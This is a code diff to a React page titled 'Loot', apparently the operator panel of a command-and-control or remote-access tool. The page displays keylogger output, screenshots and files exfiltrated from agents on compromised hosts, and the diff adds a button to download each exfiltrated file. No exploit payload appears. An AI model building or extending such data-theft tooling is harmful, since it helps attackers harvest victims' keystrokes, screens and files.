@@ -5,11 +5,15 @@ import { useSearchParams } from "next/navigation";
 import { api } from "@/lib/api";
 import { paths } from "@/lib/api-paths";
 import { toast } from "sonner";
-import { downloadText, downloadJSON } from "@/lib/download";
+import { downloadBlob, downloadText, downloadJSON } from "@/lib/download";
 import { useI18n } from "@/lib/i18n";
 import { formatTime } from "@/lib/utils";
 import { safeHref, safeImageSrc } from "@/lib/safeUrl";
-import { EmptyState, PageHeader, Pagination, StatusBadge, CopyButton } from "@/components/UI";
+import { EmptyState } from "@/components/ui/empty-state";
+import { PageContainer } from "@/components/ui/page-container";
+import { Pagination } from "@/components/ui/pagination";
+import { StatusBadge } from "@/components/ui/status-indicator";
+import { CopyButton } from "@/components/ui/copy-button";
 import { useConfirm } from "@/lib/hooks/useConfirm";
 import { DataState } from "@/components/ui/data-state";
 import { Card } from "@/components/ui/card";
@@ -28,7 +32,9 @@ import { Accordion, AccordionItem, AccordionHeader, AccordionTrigger, AccordionP
 import { LootScreenshotCard } from "./_components/LootScreenshotCard";
 import KeylogContent from "./_components/KeylogContent";
 import { useLootData } from "./_components/useLootData";
-import type { LootTab } from "./_components/types";
+import { lootDeleteId, type LootTab } from "./_components/types";
+import { canDownloadLootExfil, formatLootBytes, isLootUrlFetch, lootExfilBytes, lootExfilFilename } from "./_components/loot-exfil";
+import type { DownloadTask } from "@/types/loot";
 
 function LootPage() {
   const { t } = useI18n();
@@ -83,11 +89,11 @@ function LootPage() {
     return filteredDownloads.slice(start, start + DOWNLOAD_PAGE_SIZE);
   }, [filteredDownloads, downloadPage]);
 
-  const allAgents = [...new Set([
+  const allAgents = useMemo(() => [...new Set([
     ...(data?.screenshots?.map(s => s.agent_id) || []),
     ...(data?.keylog_tasks?.map(k => k.agent_id) || []),
     ...(data?.download_tasks?.map(d => d.agent_id) || []),
-  ])];
+  ])], [data?.screenshots, data?.keylog_tasks, data?.download_tasks]);
 
   const toggleSelect = useCallback((id: string) => {
     setSelectedItems(prev => {
@@ -103,7 +109,7 @@ function LootPage() {
   const toggleSelectAll = useCallback(() => {
     let items: string[] = [];
     if (curTab === "screenshots") items = filteredScreenshots.map(s => s.id);
-    else if (curTab === "downloads") items = filteredDownloads.map(d => d.id);
+    else if (curTab === "downloads") items = filteredDownloads.map(d => lootDeleteId("download", d));
     const allSelected = items.every(id => selectedItems.has(id));
     const next = new Set(selectedItems);
     if (allSelected) items.forEach(id => next.delete(id));
@@ -146,11 +152,20 @@ function LootPage() {
     }
   };
 
-  const formatBytes = (str: string) => {
-    const size = (str || "").length;
-    if (size < 1024) return size + " B";
-    return (size / 1024).toFixed(1) + " KB";
-  };
+  const downloadExfil = useCallback(async (d: DownloadTask) => {
+    const filename = lootExfilFilename(d);
+    if (!filename || !d.agent_id) {
+      toast.error(t("loot.download_unavailable"));
+      return;
+    }
+    try {
+      const { blob, filename: saved } = await api.downloadGet(paths.agents.filesExfilGet(d.agent_id, filename));
+      downloadBlob(blob, saved || filename);
+      toast.success(t("loot.toast.downloaded", { filename: saved || filename }));
+    } catch (e) {
+      toast.error(e instanceof Error ? e.message : t("loot.toast.download_failed"));
+    }
+  }, [t]);
 
   const lbScreenshots = filteredScreenshots;
   const lbCurrent = lbIndex >= 0 && lbIndex < lbScreenshots.length ? lbScreenshots[lbIndex] : null;
@@ -174,8 +189,10 @@ function LootPage() {
   ];
 
   return (
-    <div className="max-w-(--content-width) mx-auto pb-12 md:pb-0 animate-fade-slide-up">
-      <PageHeader title={t("loot.page_title")} subtitle={t("loot.subtitle")}>
+    <PageContainer
+      title={t("loot.page_title")}
+      subtitle={t("loot.subtitle")}
+      actions={
         <div className="flex items-center gap-2 flex-wrap">
           <Select value={agentFilter || "all"} onValueChange={(v) => { setAgentFilter(v === "all" ? "" : v ?? ""); setSelectedItems(new Set()); setScreenshotPage(1); setKeylogPage(1); setDownloadPage(1); }}>
             <SelectTrigger className="w-full sm:w-48" aria-label={t("loot.filter_agent_aria")}><SelectValue placeholder={t("loot.all_agents")} /></SelectTrigger>
@@ -196,7 +213,8 @@ function LootPage() {
             </Button>
           )}
         </div>
-      </PageHeader>
+      }
+    >
 
       <DataState
         loading={loading}
@@ -306,7 +324,7 @@ function LootPage() {
                             <Button variant="ghost" size="sm" onClick={() => downloadText(full, `keylog-${agentName}-${k.id}.txt`)} className="text-xs h-auto p-1 text-primary" aria-label={t("common.download")}><Download aria-hidden="true" className="w-4 h-4" /></Button>
                           </div>
                         </div>
-                        <div className="bg-background text-emerald-700 dark:text-emerald-300 font-mono text-xs p-4 max-h-[500px] overflow-y-auto whitespace-pre-wrap break-all">
+                        <div className="bg-background text-success font-mono text-xs p-4 max-h-[500px] overflow-y-auto whitespace-pre-wrap break-all">
                           <KeylogContent text={full} />
                         </div>
                       </AccordionPanel>
@@ -345,24 +363,64 @@ function LootPage() {
             <Table>
               <TableHeader>
                 <TableRow>
+                  <TableHead className="w-8">
+                    <Checkbox
+                      checked={filteredDownloads.length > 0 && filteredDownloads.every((d) => selectedItems.has(lootDeleteId("download", d)))}
+                      onCheckedChange={toggleSelectAll}
+                      aria-label={t("loot.a11y_select_all")}
+                    />
+                  </TableHead>
                   <TableHead>{t("loot.time")}</TableHead>
-                  <TableHead>{t("loot.file_path")}</TableHead>
                   <TableHead>{t("loot.source")}</TableHead>
+                  <TableHead>{t("loot.file_path")}</TableHead>
                   <TableHead>{t("loot.size")}</TableHead>
                   <TableHead>{t("loot.status")}</TableHead>
+                  <TableHead className="text-right">{t("loot.actions")}</TableHead>
                 </TableRow>
               </TableHeader>
               <TableBody>
-                {visibleDownloads.map(d => (
-                  <TableRow key={d.id}>
-                    <TableCell className="font-mono text-xs text-muted-foreground">{formatTime(d.created_at)}</TableCell>
-                    <TableCell><span className="font-medium text-xs">{d.agent?.hostname || d.hostname || d.agent_id.substring(0, 8)}</span></TableCell>
-                    <TableCell className="font-mono text-xs text-muted-foreground max-w-[200px] truncate">{d.command}</TableCell>
-                    <TableCell className="font-mono text-xs text-muted-foreground max-w-[300px] truncate">{d.result || "-"}</TableCell>
-                    <TableCell className="text-xs text-muted-foreground">{formatBytes(d.result || "")}</TableCell>
-                    <TableCell><StatusBadge status={d.status} /></TableCell>
-                  </TableRow>
-                ))}
+                {visibleDownloads.map(d => {
+                  const rowId = lootDeleteId("download", d);
+                  const host = d.agent?.hostname || d.hostname || d.agent_id.substring(0, 8);
+                  const filename = lootExfilFilename(d);
+                  const canDl = canDownloadLootExfil(d);
+                  return (
+                    <TableRow key={d.id}>
+                      <TableCell>
+                        <Checkbox
+                          checked={selectedItems.has(rowId)}
+                          onCheckedChange={() => toggleSelect(rowId)}
+                          aria-label={t("loot.a11y_select_row")}
+                        />
+                      </TableCell>
+                      <TableCell className="font-mono text-xs text-muted-foreground">{formatTime(d.created_at)}</TableCell>
+                      <TableCell><span className="font-medium text-xs">{host}</span></TableCell>
+                      <TableCell className="font-mono text-xs text-muted-foreground max-w-[280px] truncate" title={d.command}>
+                        {filename || d.command || "—"}
+                      </TableCell>
+                      <TableCell className="font-mono text-xs text-muted-foreground">{formatLootBytes(lootExfilBytes(d.result))}</TableCell>
+                      <TableCell><StatusBadge status={d.status} /></TableCell>
+                      <TableCell className="text-right">
+                        {canDl ? (
+                          <Button
+                            type="button"
+                            variant="ghost"
+                            size="xs"
+                            className="gap-1"
+                            onClick={() => { void downloadExfil(d); }}
+                          >
+                            <Download aria-hidden="true" className="w-3.5 h-3.5" />
+                            {t("loot.download_file")}
+                          </Button>
+                        ) : isLootUrlFetch(d.command) ? (
+                          <span className="text-(--fs-micro-sm) text-muted-foreground" title={t("loot.download_unavailable")}>
+                            {t("loot.url_fetch")}
+                          </span>
+                        ) : null}
+                      </TableCell>
+                    </TableRow>
+                  );
+                })}
               </TableBody>
             </Table>
             </div>
@@ -411,7 +469,7 @@ function LootPage() {
         </Dialog>
       )}
       {modal}
-    </div>
+    </PageContainer>
   );
 }
 
